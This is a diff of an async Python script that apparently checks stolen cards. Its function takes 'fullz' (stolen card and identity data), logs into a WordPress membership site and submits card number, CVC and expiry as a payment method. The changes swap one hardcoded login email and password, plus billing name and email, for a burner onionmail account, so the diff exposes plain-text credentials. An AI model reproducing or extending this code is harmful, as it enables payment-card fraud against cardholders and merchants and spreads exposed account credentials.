@@ -113,8 +113,8 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> tuple
         data = {
             'learndash-login-form': login,
             'pmpro_login_form_used': '1',
-            'log': 'oliverjackson1209@gmail.com',
-            'pwd': 'Oliverjack1209',
+            'log': 'senryjo@onionmail.org',
+            'pwd': 'Senryjo123789@',
             'wp-submit': 'Log In',
             'redirect_to': '',
         }
@@ -198,8 +198,8 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> tuple
 
         data = {
             'type':'card',
-            'billing_details[name]':'oliver jackson',
-            'billing_details[email]':'oliverjackson1209@gmail.com',
+            'billing_details[name]':'senry joshua',
+            'billing_details[email]':'senryjo@onionmail.org',
             'card[number]': cc,
             'card[cvc]': cvv,
             'card[exp_month]': mes,
@@ -569,5 +569,4 @@ def main() -> None:
 
 if __name__ == "__main__":
     main()
-
 
